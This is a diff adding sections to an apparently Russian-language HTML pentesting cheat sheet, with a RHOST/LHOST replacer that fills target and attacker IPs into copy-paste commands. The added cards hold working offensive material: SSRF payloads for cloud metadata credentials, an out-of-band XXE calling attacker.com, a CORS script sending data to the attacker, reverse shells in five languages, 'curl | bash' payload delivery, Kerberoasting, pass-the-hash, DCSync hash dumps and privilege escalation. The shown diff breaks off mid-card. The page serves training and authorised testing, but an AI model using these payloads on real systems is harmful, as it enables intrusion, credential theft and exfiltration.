@@ -71,6 +71,43 @@
     </nav>
 
     <main id="mainContent">
+      <!-- QUICK-TOOLBAR: RHOST/LHOST Replacer, Compact View, and Fast Category Tabs -->
+      <div class="quick-toolbar" id="quickToolbar">
+        <div class="toolbar-top">
+          <div class="ip-replacer">
+            <div class="ip-group">
+              <label for="inputRhost"><span class="badge rhost">RHOST</span> Цель:</label>
+              <input type="text" id="inputRhost" placeholder="10.10.10.1" spellcheck="false" autocomplete="off" title="Целевой IP-адрес или домен — автоматически подставляется в команды">
+            </div>
+            <div class="ip-group">
+              <label for="inputLhost"><span class="badge lhost">LHOST</span> Твой IP:</label>
+              <input type="text" id="inputLhost" placeholder="10.10.14.2" spellcheck="false" autocomplete="off" title="IP атакующего для реверс-шеллов">
+            </div>
+            <button type="button" class="btn-tb" id="btnResetIp" title="Сбросить IP к значениям по умолчанию">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg>
+              <span>Сброс</span>
+            </button>
+          </div>
+          <div class="view-toggles">
+            <button type="button" class="btn-tb" id="btnCompactMode" title="Режим «только команды» без длинных описаний" aria-pressed="false">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+              <span>Компактно</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="cat-tabs" id="catTabs" role="tablist" aria-label="Быстрая фильтрация по категориям">
+          <button type="button" class="cat-tab active" data-cat="all">⚡ Все разделы</button>
+          <button type="button" class="cat-tab" data-cat="linux">🐧 Linux</button>
+          <button type="button" class="cat-tab" data-cat="recon">🌐 Recon</button>
+          <button type="button" class="cat-tab" data-cat="web">💉 Web / OWASP</button>
+          <button type="button" class="cat-tab" data-cat="ad">🏰 Active Directory</button>
+          <button type="button" class="cat-tab" data-cat="privesc">⚡ PrivEsc</button>
+          <button type="button" class="cat-tab" data-cat="defense">🛡️ Blue Team</button>
+          <button type="button" class="cat-tab" data-cat="oneliners">⚙️ One-liners</button>
+        </div>
+      </div>
+
       <!--SEC-howto-->
       <section class="block" id="howto">
         <div class="sec-head"><span class="sec-num">01</span>
@@ -117,8 +154,11 @@
           <div class="term"><b>Payload</b> — полезная нагрузка: код/команда, которую атакующий доставляет жертве (shell,
             скрипт). <a href="#attack">→ атака</a></div>
           <div class="term"><b>Privilege Escalation</b> — повышение привилегий: из обычного пользователя до root/admin.
-            <a href="#privesc">→ privesc</a>
+            <a href="#attack">→ privesc</a>
           </div>
+          <div class="term"><b>SSRF / IDOR / XXE</b> — ключевые уязвимости веб-приложений (OWASP): подделка серверных запросов, прямой доступ к объектам, парсинг XML. <a href="#cmd-ssrf">→ web</a></div>
+          <div class="term"><b>Active Directory (AD) &amp; Kerberos</b> — служба каталогов Windows: билеты TGT/TGS, атаки Kerberoasting, AS-REP Roasting и DCSync. <a href="#cmd-ad-bloodhound">→ AD</a></div>
+          <div class="term"><b>GTFOBins &amp; LOLBAS</b> — использование легитимных системных утилит ОС для побега из песочниц и повышения привилегий. <a href="#cmd-privesc-linux">→ GTFOBins</a></div>
           <div class="term"><b>Zero-day</b> — уязвимость, о которой вендор ещё не знает (или не выпустил патч). <a
               href="#defense">→ защита</a></div>
           <div class="term"><b>Phishing</b> — социальная инженерия: жертва сама «открывает дверь» по ссылке/письму. <a
@@ -126,7 +166,7 @@
           <div class="term"><b>C2 (Command &amp; Control)</b> — канал управления скомпрометированной машиной. <a
               href="#scenario">→ сценарий</a></div>
           <div class="term"><b>Lateral Movement</b> — горизонтальное перемещение атакующего внутри сети после первого
-            доступа. <a href="#scenario">→ сценарий</a></div>
+            доступа. <a href="#cmd-ad-impacket">→ lateral</a></div>
           <div class="term"><b>MITM (Man-in-the-Middle)</b> — перехват и подмена трафика между двумя сторонами. <a
               href="#tools">→ инструменты</a></div>
         </div>
@@ -403,10 +443,10 @@ lsof +D /var/www          # всё открытое в каталоге</pre>
           <div class="cmd-head">
             <h3>nmap — сканирование портов и сервисов</h3><span class="diff diff-base">База</span>
           </div>
-          <pre class="code">nmap target_ip                          # топ-1000 TCP-портов
-nmap -sV -sC target_ip                  # версии сервисов + дефолтные NSE-скрипты
-nmap -p- --min-rate=5000 target_ip      # все 65535 портов, быстро
-nmap -O target_ip                       # определение ОС (точнее от root)</pre>
+          <pre class="code">nmap <span class="ph-rhost">10.10.10.1</span>                          # топ-1000 TCP-портов
+nmap -sV -sC <span class="ph-rhost">10.10.10.1</span>                  # версии сервисов + дефолтные NSE-скрипты
+nmap -p- --min-rate=5000 <span class="ph-rhost">10.10.10.1</span>      # все 65535 портов, быстро
+nmap -O <span class="ph-rhost">10.10.10.1</span>                       # определение ОС (точнее от root)</pre>
           <p class="cmd-note"><b>-sV</b> — версия сервиса, <b>-sC</b> — дефолтные скрипты NSE, <b>-p-</b> — все порты,
             <b>-O</b> — OS fingerprinting. Результат: что открыто и какие версии.
           </p>
@@ -418,9 +458,9 @@ nmap -O target_ip                       # определение ОС (точн�
           <div class="cmd-head">
             <h3>gobuster / ffuf — перебор директорий и имён</h3><span class="diff diff-base">База</span>
           </div>
-          <pre class="code">gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
-ffuf -u http://target/FUZZ -w wordlist.txt          # FUZZ — маркер подстановки
-gobuster vhost -u http://target -w subdomains-top1000.txt</pre>
+          <pre class="code">gobuster dir -u http://<span class="ph-rhost">10.10.10.1</span> -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://<span class="ph-rhost">10.10.10.1</span>/FUZZ -w wordlist.txt          # FUZZ — маркер подстановки
+gobuster vhost -u http://<span class="ph-rhost">10.10.10.1</span> -w subdomains-top1000.txt</pre>
           <p class="cmd-note">Ищет «двери», которые не указаны в меню сайта: /admin, /backup, /.git. ffuf быстрее и
             гибче (поддерживает JSON-ответы, заголовки).</p>
           <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
@@ -451,6 +491,35 @@ subfinder -d example.com                   # пассивный поиск по�
             собирает поддомены из публичных источников без обращения к цели.</p>
           <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
               data-tag="osint">#osint</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-rustscan" data-tags="recon network tools">
+          <div class="cmd-head">
+            <h3>rustscan — молниеносный скан всех 65535 портов</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">rustscan -a <span class="ph-rhost">10.10.10.1</span> --ulimit 5000 -- -sV -sC -oN full_scan.txt
+rustscan -a 192.168.1.0/24 -r 1-65535 -- -A           # диапазон портов всей подсети
+rustscan -a <span class="ph-rhost">10.10.10.1</span> -b 1000 -t 2000 -- -sC          # пакетный скан с кастомным таймаутом</pre>
+          <p class="cmd-note">Написан на Rust с асинхронным сокет-движком. Сканирует все 65 535 портов за секунды и
+            автоматически скармливает только найденные открытые порты в nmap (аргументы после <code>--</code>) для глубокого анализа сервисов.</p>
+          <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
+              data-tag="network">#network</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-ferox-kiterunner" data-tags="recon web tools">
+          <div class="cmd-head">
+            <h3>feroxbuster / kiterunner — рекурсивный фаззинг веб-путей и API</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># Рекурсивный обход директорий на Rust (авто-фильтр статус-кодов и размера):
+feroxbuster -u http://<span class="ph-rhost">10.10.10.1</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -d 2 -x php,html,txt
+
+# Интеллектуальный поиск эндпоинтов API (Swagger, GraphQL, REST):
+kr scan http://<span class="ph-rhost">10.10.10.1</span>:8080/api -w /usr/share/kiterunner/routes-large.kite -m apis
+kr brute http://<span class="ph-rhost">10.10.10.1</span>/api/v1 -w wordlist.txt -x 20</pre>
+          <p class="cmd-note"><b>feroxbuster</b> рекурсивно и параллельно пробивает скрытые файлы и директории быстрее gobuster.
+            <b>kiterunner (kr)</b> натренирован на датасетах реальных корпоративных API: автоматически подставляет правильные HTTP-глаголы (GET/POST/PUT) и схемы заголовков.</p>
+          <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
+              data-tag="web">#web</span></div>
         </article>
 
         <div class="callout qa"><span class="co-title">Частый вопрос новичка</span>«nmap или masscan?» Для одной-двух
@@ -545,6 +614,252 @@ sqlmap -u "http://target/page?id=1" -D shop -T users --dump</pre>
               data-tag="web">#web</span></div>
         </article>
 
+        <article class="card cmd-card" id="cmd-ssrf" data-tags="attack web owasp cloud">
+          <div class="cmd-head">
+            <h3>SSRF — Server-Side Request Forgery &amp; Cloud Metadata</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># Доступ к внутренним сервисам (Loopback / Private LAN):
+http://127.0.0.1:8080/admin
+http://localhost:6379/                       # Redis без пароля (RCE через crontab)
+
+# Облачные метаданные (AWS / GCP / DigitalOcean) — кража временных IAM ключей:
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/   # Заголовок: "Metadata-Flavor: Google"
+http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure (Header: "Metadata:true")
+
+# Трюки обхода WAF и фильтров 127.0.0.1:
+http://[::1]:80/                             # IPv6 loopback
+http://0177.0.0.1/                           # Восьмеричный формат (Octal)
+http://2130706433/                           # Десятичный IP (Decimal dword)
+http://localtest.me/                         # DNS-запись, резолвящаяся в 127.0.0.1</pre>
+          <p class="cmd-note">Уязвимый сервер выполняет HTTP-запрос по указанному пользователем URL. Позволяет читать внутренние API, пробивать облачные метаданные и обходить сетевые экраны. Защита: жесткий whitelist доверенных доменов, IMDSv2 (Session Token), запрет перенаправлений (redirects).</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="web">#web</span><span class="tag-link" data-tag="cloud">#cloud</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-xxe" data-tags="attack web owasp">
+          <div class="cmd-head">
+            <h3>XXE — внедрение внешних сущностей XML</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">&lt;!-- Классическое чтение системных файлов (LFI): --&gt;
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;
+
+&lt;!-- PHP фильтр для чтения исходного кода без исполнения: --&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php"&gt; ]&gt;
+
+&lt;!-- Blind XXE через выгрузку данных наружу (Out-of-Band OOB): --&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval SYSTEM "http://attacker.com/evil.dtd"&gt; %eval; ]&gt;</pre>
+          <p class="cmd-note">Возникает, когда парсер XML обрабатывает директивы <code>&lt;!DOCTYPE&gt;</code> и внешние сущности (External Entities). Защита: полное отключение DTD и внешних сущностей в парсере (например, <code>libxml_disable_entity_loader(true)</code> в PHP, <code>disallow-doctype-decl</code> в Java).</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="web">#web</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-jwt" data-tags="attack web owasp auth">
+          <div class="cmd-head">
+            <h3>JWT — атаки на веб-токены аутентификации</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Атака "alg: none" — удаление криптографической подписи:
+# Меняем заголовок {"alg":"none","typ":"JWT"}, payload {"role":"admin"}, стираем сигнатуру:
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyZXN1bHQiOiJhZG1pbiJ9.
+
+# 2. Оффлайн-брутфорс слабого HMAC-секрета (HS256) через Hashcat:
+hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
+
+# 3. Автоматизированная фальсификация и аудит уязвимостей через jwt_tool:
+python3 jwt_tool.py &lt;JWT&gt; -C -d /usr/share/wordlists/rockyou.txt
+python3 jwt_tool.py &lt;JWT&gt; -X a   # проверка алгоритма none</pre>
+          <p class="cmd-note">JWT состоит из 3 частей (Header.Payload.Signature в Base64Url). Опасности: слабозащищенный общий секрет, поддержка неподписанных токенов (none) и путаница алгоритмов (Key Confusion RS256 ➔ HS256 с публичным ключом сервера в качестве секрета).</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="web">#web</span><span class="tag-link" data-tag="auth">#auth</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-idor-cors" data-tags="attack web owasp">
+          <div class="cmd-head">
+            <h3>IDOR &amp; CORS Misconfigurations</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code"># IDOR: подмена ID в REST API / эндпоинтах пользователя:
+GET /api/v1/users/1042/profile   ➔   GET /api/v1/users/1041/profile
+GET /documents/download?doc_id=5812
+POST /api/account/email/update {"user_id": 99, "new_email": "attacker@evil.com"}
+
+# Эксплуатация небезопасного CORS (Origin Reflection + Credentials: true):
+&lt;script&gt;
+  fetch('http://<span class="ph-rhost">10.10.10.1</span>/api/private-data', { credentials: 'include' })
+    .then(r =&gt; r.text())
+    .then(data =&gt; fetch('http://<span class="ph-lhost">10.10.14.2</span>/log?d=' + encodeURIComponent(data)));
+&lt;/script&gt;</pre>
+          <p class="cmd-note"><b>IDOR:</b> отсутствие проверки прав доступа объекта (Authorization/ACL). Если приложение проверяет только факт логина, но не принадлежность ресурса пользователю — любой читает чужие данные. <b>CORS Misconfig:</b> доверие <code>Origin: null</code> или произвольным доменам вместе с флагом <code>Access-Control-Allow-Credentials: true</code> приводит к краже сессионных данных через браузер жертвы.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="web">#web</span></div>
+        </article>
+
+        <h3 class="group-title">Reverse Shells &amp; TTY Upgrade</h3>
+
+        <article class="card cmd-card" id="cmd-revshells" data-tags="attack web shell">
+          <div class="cmd-head">
+            <h3>Reverse Shells — обратные шеллы (Bash, Python, PHP, Netcat, PowerShell)</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code"># 0. На машине атакующего — слушатель (Listener):
+nc -lvnp 4444
+
+# 1. Bash TCP (самый стабильный без стороннего ПО):
+bash -i &gt;&amp; /dev/tcp/<span class="ph-lhost">10.10.14.2</span>/4444 0&gt;&amp;1
+/bin/sh -i &gt;&amp; /dev/tcp/<span class="ph-lhost">10.10.14.2</span>/4444 0&gt;&amp;1
+
+# 2. Python 3:
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span class="ph-lhost">10.10.14.2</span>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
+# 3. PHP (из веб-пейлоада или веб-шелла):
+php -r '$sock=fsockopen("<span class="ph-lhost">10.10.14.2</span>",4444);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+
+# 4. Netcat (с созданием именованного FIFO-канала):
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc <span class="ph-lhost">10.10.14.2</span> 4444 &gt;/tmp/f
+
+# 5. PowerShell (для Windows-целей):
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<span class="ph-lhost">10.10.14.2</span>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2&gt;&amp;1|Out-String);$sb2=$sb+'PS '+(pwd)+'&gt; ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()"</pre>
+          <p class="cmd-note">Обратный шелл инициирует исходящее соединение с жертвы на машину пентестера, что обходит входящие правила фаервола (NAT/Stateful Firewall). Рекомендуется вешать слушатель на порты 443 или 80, которые почти всегда разрешены наружу.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="web">#web</span><span class="tag-link" data-tag="shell">#shell</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-tty-upgrade" data-tags="attack linux shell privesc">
+          <div class="cmd-head">
+            <h3>Стабилизация TTY Shell (Full Interactive TTY)</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># Шаг 1. Спавн полноценного псевдо-терминала на жертве:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# (Если python3 нет: script -qc /bin/bash /dev/null)
+
+# Шаг 2. Отправка dumb-шелла в фон атакующей машины:
+# Нажимаем на клавиатуре: Ctrl + Z
+
+# Шаг 3. Перевод локального терминала в «сырой» режим и возврат шелла на передний план:
+stty raw -echo; fg
+
+# Шаг 4. Настройка переменных окружения внутри шелла жертвы:
+reset
+export TERM=xterm-256color
+export SHELL=bash
+
+# Шаг 5. Синхронизация геометрии окна (строки и столбцы):
+# В отдельной вкладке своего терминала проверяем размер: stty size (напр: 42 165)
+stty rows 42 columns 165</pre>
+          <p class="cmd-note"><b>Зачем это делать обязательно:</b> спасает шелл от смерти при случайном нажатии <code>Ctrl+C</code>, включает автодополнение по клавише <b>Tab</b>, историю стрелочками, очистку <code>clear</code>, и позволяет запускать интерактивные программы (<code>nano</code>, <code>vim</code>, <code>top</code>, <code>su</code>, <code>sudo</code>).</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="linux">#linux</span><span class="tag-link" data-tag="shell">#shell</span></div>
+        </article>
+
+        <h3 class="group-title">Pivoting, Tunneling &amp; File Transfer</h3>
+
+        <article class="card cmd-card" id="cmd-pivoting" data-tags="attack network pivoting">
+          <div class="cmd-head">
+            <h3>Pivoting &amp; Tunneling: проброс трафика во внутреннюю сеть</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. SSH Dynamic SOCKS Proxy (выход во внутреннюю подсеть через скомпрометированный узел):
+ssh -D 1080 -N -f user@<span class="ph-rhost">10.10.10.1</span>
+# Прописываем в /etc/proxychains4.conf в самом конце: socks5 127.0.0.1 1080
+# Запуск любых утилит через туннель:
+proxychains4 nmap -sT -Pn 172.16.0.0/24
+
+# 2. SSH Local Port Forwarding (доступ к закрытому порту на сервере, напр. MySQL 3306 или веб-сервер 8080):
+ssh -L 8080:127.0.0.1:8080 user@<span class="ph-rhost">10.10.10.1</span> -N
+
+# 3. Chisel (универсальный туннель через HTTP/WebSockets для обхода строгих фаерволов):
+# На машине атакующего (сервер):
+./chisel server -p 8000 --reverse
+# На скомпрометированной машине (клиент):
+./chisel client <span class="ph-lhost">10.10.14.2</span>:8000 R:socks             # поднимает SOCKS5 прокси на атакующем (порт 1080)
+./chisel client <span class="ph-lhost">10.10.14.2</span>:8000 R:8000:127.0.0.1:80     # проброс конкретного внутреннего веб-сервиса</pre>
+          <p class="cmd-note"><b>Pivoting</b> позволяет использовать скомпрометированный сервер как мост (Jump Host) во внутренний периметр компании (DMZ ➔ LAN). Утилита <code>proxychains</code> перехватывает сетевые вызовы программ и пускает их через созданный SOCKS-прокси.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="network">#network</span><span class="tag-link" data-tag="pivoting">#pivoting</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-file-transfer" data-tags="attack tools transfer">
+          <div class="cmd-head">
+            <h3>File Transfer: быстрая доставка эксплойтов и скриптов</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code"># 1. Запуск сервера раздачи на машине атакующего:
+python3 -m http.server 80                      # HTTP веб-сервер
+impacket-smbserver share . -smb2support        # SMB-шара (для Windows без сохранения на диск)
+
+# 2. Скачивание на целевой Linux:
+curl -sO http://<span class="ph-lhost">10.10.14.2</span>/linpeas.sh
+wget -q http://<span class="ph-lhost">10.10.14.2</span>/linpeas.sh -O /tmp/lp.sh
+# Выполнение скрипта напрямую в оперативную память (Memory-only):
+curl -sL http://<span class="ph-lhost">10.10.14.2</span>/linpeas.sh | bash
+
+# 3. Скачивание на целевой Windows:
+certutil.exe -urlcache -split -f http://<span class="ph-lhost">10.10.14.2</span>/winpeas.exe C:\Users\Public\wp.exe
+powershell -c "Invoke-WebRequest -Uri 'http://<span class="ph-lhost">10.10.14.2</span>/winpeas.exe' -OutFile 'wp.exe'"
+powershell -c "iwr -useb http://<span class="ph-lhost">10.10.14.2</span>/winpeas.exe -outfile wp.exe"
+# Прямой запуск бинарника с SMB-шары без записи на диск:
+\\<span class="ph-lhost">10.10.14.2</span>\share\mimikatz.exe</pre>
+          <p class="cmd-note">Выбор метода доставки зависит от ОС и наличия антивируса/EDR. Использование SMB-шары на Windows или пайплайна <code>curl | bash</code> на Linux оставляет минимум следов на диске целевой системы.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="tools">#tools</span></div>
+        </article>
+
+        <h3 class="group-title">Active Directory &amp; Kerberos (Enterprise Red Team)</h3>
+
+        <article class="card cmd-card" id="cmd-ad-bloodhound" data-tags="attack ad recon windows">
+          <div class="cmd-head">
+            <h3>BloodHound — анализ графа путей атак в Active Directory</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Сбор данных из Linux без привязки к доменной машине:
+bloodhound-python -d domain.local -u 'low_user' -p 'Pass123!' -gc dc.domain.local -c All -ns 10.10.10.1
+
+# 2. Сбор данных из-под скомпрометированного Windows хоста (SharpHound):
+.\SharpHound.exe -c All --outputdirectory C:\Users\Public\
+
+# 3. Анализ в интерфейсе BloodHound / Neo4j:
+# "Find Shortest Paths to Domain Admins", "Find Computers where Domain Users are Local Admin"</pre>
+          <p class="cmd-note">BloodHound моделирует Active Directory как граф связей (пользователи, группы, компьютеры, сессии, ACL/ACE). Позволяет за секунды увидеть скрытые цепочки компрометации (например: User ➔ GenericAll над Group B ➔ Local Admin на СУБД ➔ Domain Admin через сессию в памяти).</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="ad">#ad</span><span class="tag-link" data-tag="windows">#windows</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-ad-kerberoast" data-tags="attack ad brute-force">
+          <div class="cmd-head">
+            <h3>Kerberoasting &amp; AS-REP Roasting</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Kerberoasting — запрос тикетов TGS для сервисных учетных записей (SPN):
+impacket-GetUserSPNs domain.local/user:'Password' -dc-ip 10.10.10.1 -request -outputfile kerb.hashes
+# Оффлайн-взлом TGS (Hashcat режим 13100):
+hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt
+
+# 2. AS-REP Roasting — атака на аккаунты без требования преаутентификации (DONT_REQ_PREAUTH):
+impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat -outputfile asrep.hashes
+# Оффлайн-взлом AS-REP (Hashcat режим 18200):
+hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt</pre>
+          <p class="cmd-note"><b>Kerberoasting:</b> любой доменный пользователь вправе запросить у KDC сервисный тикет TGS на сервис (MSSQL, HTTP). Тикет зашифрован NTLM-хэшем сервисного аккаунта ➔ извлекаем и ломаем локально без риска блокировки аккаунта. <b>AS-REP Roasting</b> даже не требует пароля для старта атаки.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="ad">#ad</span><span class="tag-link" data-tag="brute-force">#brute-force</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-ad-impacket" data-tags="attack ad lateral-movement windows">
+          <div class="cmd-head">
+            <h3>Impacket — удалённое исполнение, Pass-the-Hash и DCSync</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># Удаленное исполнение через создание службы (интерактивный shell):
+impacket-psexec domain.local/admin:'Password'@10.10.10.1
+
+# Скрытное исполнение через WMI без записи бинарника службы на диск:
+impacket-wmiexec domain.local/admin:'Password'@10.10.10.1
+
+# Pass-the-Hash (PTH) — вход по NTLM хэшу без знания чистого пароля:
+impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.10.10.1
+
+# DCSync — дамп всей базы NTDS.dit (парольные хэши всех доменных пользователей):
+impacket-secretsdump domain.local/admin:'Password'@10.10.10.1</pre>
+          <p class="cmd-note">Impacket — стандарт де-факто для Red Team в Windows-сетях. <b>DCSync</b> эмулирует поведение контроллера домена по протоколу DRSUAPI, заставляя настоящий DC отдать хэши паролей учетной записи `krbtgt` и администраторов без исполнения кода на самом контроллере.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="ad">#ad</span><span class="tag-link" data-tag="lateral-movement">#lateral-movement</span></div>
+        </article>
+
         <h3 class="group-title">Privilege Escalation — повышение привилегий</h3>
 
         <article class="card cmd-card" id="privesc" data-tags="attack privesc linux">
@@ -559,22 +874,90 @@ sqlmap -u "http://target/page?id=1" -D shop -T users --dump</pre>
               data-tag="privesc">#privesc</span></div>
         </article>
 
-        <article class="card cmd-card" id="cmd-privesc-manual" data-tags="attack privesc linux">
+        <article class="card cmd-card" id="cmd-privesc-linux" data-tags="attack privesc linux">
           <div class="cmd-head">
-            <h3>Ручные проверки (то, что ищет linpeas)</h3><span class="diff diff-pro">Продвинутый</span>
+            <h3>Linux PrivEsc: GTFOBins, Capabilities и Writable Scripts</h3><span class="diff diff-pro">Продвинутый</span>
           </div>
-          <pre class="code">sudo -l                          # какие команды можно запускать от sudo?
-find / -perm -4000 2&gt;/dev/null   # SUID-бинарники (vim, find, nmap → root)
-cat /etc/crontab; ls /etc/cron*  # cron: кто и что запускает с правами root
-ls -la /var/backups/             # бэкапы БД с паролями в открытом виде
-id                               # кто я? какие группы? (docker = почти root)
-uname -a                         # версия ядра → CVE по LPE-базам</pre>
-          <p class="cmd-note">Классика: <code>sudo vim</code> → <code>:!/bin/sh</code>; SUID на <code>find</code> →
-            <code>find / -exec /bin/sh \; -quit</code>; доступ к группе <code>docker</code> → контейнер с монтированным
-            <code>/</code>.
-          </p>
+          <pre class="code"># 1. Права sudo без пароля (sudo -l) + побег из оболочек (GTFOBins):
+sudo -l
+sudo vim -c ':!/bin/sh'                    # побег из vim в root shell
+sudo less /etc/profile                     # вводим !/bin/sh внутри пейджера
+sudo find . -exec /bin/sh \; -quit        # выполнение шелла из find
+
+# 2. Linux Capabilities (нарезка прав суперпользователя на бинарники):
+getcap -r / 2&gt;/dev/null
+# Эксплуатация cap_setuid на Python:
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# 3. Анализ cron-задач и системных таймеров (поиск скриптов с правами записи):
+cat /etc/crontab; ls -la /etc/cron* /var/spool/cron/crontabs
+find /etc/systemd/system/ -writable 2&gt;/dev/null
+# Мониторинг запуска фоновых процессов без root:
+./pspy64 -pf -i 1000
+
+# 4. Проверка экспортов NFS (no_root_squash):
+cat /etc/exports                           # если no_root_squash — монтируем с клиента и создаем SUID</pre>
+          <p class="cmd-note"><b>GTFOBins</b> — ключевая база легальных утилит Unix, позволяющих получить shell при наличии прав sudo или SUID. <b>Capabilities</b> дают процессам отдельные привилегии root (<code>cap_setuid</code>, <code>cap_dac_read_search</code>) без полного SUID-бита.</p>
           <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
-              data-tag="privesc">#privesc</span></div>
+              data-tag="privesc">#privesc</span><span class="tag-link" data-tag="linux">#linux</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-privesc-windows" data-tags="attack privesc windows">
+          <div class="cmd-head">
+            <h3>Windows PrivEsc: SeImpersonate, Unquoted Paths и AlwaysInstall</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Разведка текущих токенов и привилегий:
+whoami /priv; whoami /groups
+
+# 2. Potato-атаки при наличии SeImpersonatePrivilege или SeAssignPrimaryToken:
+# (Типично для сервисных учетных записей IIS APPPOOL\*, MSSQL$*):
+GodPotato-NET4.exe -cmd "cmd.exe /c whoami"              # мгновенный NT AUTHORITY\SYSTEM
+SweetPotato.exe -e cmd -c "whoami"
+
+# 3. Поиск путей служб без кавычек (Unquoted Service Paths):
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+# Пример: C:\Program Files\Vendor App\service.exe ➔ подкладываем C:\Program.exe
+
+# 4. Проверка AlwaysInstallElevated (установка MSI с правами SYSTEM):
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Генерация MSI-пейлоада: msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f msi -o exp.msi
+msiexec /quiet /qn /i exp.msi</pre>
